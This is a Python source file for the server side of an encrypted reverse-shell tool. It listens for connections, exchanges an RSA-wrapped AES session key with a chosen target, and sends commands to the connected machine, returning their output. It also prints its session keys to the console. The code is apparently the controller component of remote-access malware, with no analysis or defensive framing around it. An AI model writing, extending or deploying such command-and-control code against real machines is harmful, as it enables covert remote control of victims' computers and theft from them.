from CryptoAC.Asymmetric.Rsa import RSA
from CryptoAC.Symmetric.AcAes import AesCrypto
from .ConnectionsManager import ConnectionManager
from .internalClient import InternalSocketClient
from Tools.toolsF import randombyte
import socket
import time
import threading



class Server(object):
    
    def __init__(self,PrivateKey,port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ServInfo = (
            socket.gethostbyname(socket.gethostname())
            ,port
        )
        self.connections = ConnectionManager()
        self.rsa = RSA()
        self.PrivateKey = PrivateKey
        self.rsaBlock = (PrivateKey['n'].bit_length()+7)//8
        self.testMsg = bytes([100])
        self.sleepPerPing = 2 
        self.sleepPeriter = 2
        self._internalclient = InternalSocketClient()
        
       
    def setCipher(self,conn):
        msg = conn.recv(self.rsaBlock)
        key = self.rsa.decrypt(
            self.PrivateKey,
            msg
        )
        self.connections.addAesToconnection(
            conn,
            AesCrypto(key, None)
        ) 


    def ping(self, conn, timeout=5):
        try:
            conn.send(self.testMsg)
            conn.settimeout(timeout)
            response = conn.recv(3)
            conn.settimeout(None)
            if response:
                return True
        except (socket.timeout, ConnectionResetError, BrokenPipeError, OSError):
            pass
        return False
    
    
    def onConnect(self,conn,addr):
        self.connections.insertNewConnction(conn)
        while True:
            if self.connections.connctTo == addr[0]:
                self.connections.connectToTarget(conn)
                self._setShellMode(conn)
            elif not self.ping(conn):
                conn.close()
                self.connections.removeConnection(conn)
                return
            time.sleep(self.sleepPeriter)
                               
             
    def sendMsg(self, connection, msg):
        msg = connection.aes.encrypt(msg)
        connection.conn.send(
            int.to_bytes(
                len(msg),
                length=4,
                byteorder='big',
            ) + msg
        )


    def recvMsg(self,connection):
        header = int.from_bytes(connection.conn.recv(4))
        res = connection.conn.recv(header)
        while len(res) < header:
            res += connection.conn.recv(header-len(res))
        return connection.aes.decrypt(res)
    

    def retriveCommand(self,connection, command):
        print(f'key is: {connection.aes.key}\niv:{connection.aes.iv}')
        command = self.sendMsg(connection,command.encode())
        return self.recvMsg(connection).decode(errors='replace')
        

    def _setShellMode(self,conn):
        print('Satrting RevrseShell...')
        self.setCipher(conn)
        ip = conn.getpeername()[0]
        while self.connections.isconnected(ip):
            time.sleep(5)
        self.connections.removeConnection(conn)
        
    
    def __listener__(self):
        self.server.bind(self.ServInfo)
        self.server.listen()
        print("{+}Listening...")
        while True:
            conn, addr = self.server.accept()
            print("Accept Connection.")
            threading.Thread(
                target=self.onConnect,
                args=(conn,addr)
            ).start()
            time.sleep(1)

            
    def start(self):
        threading.Thread(target=self.__listener__).start()
        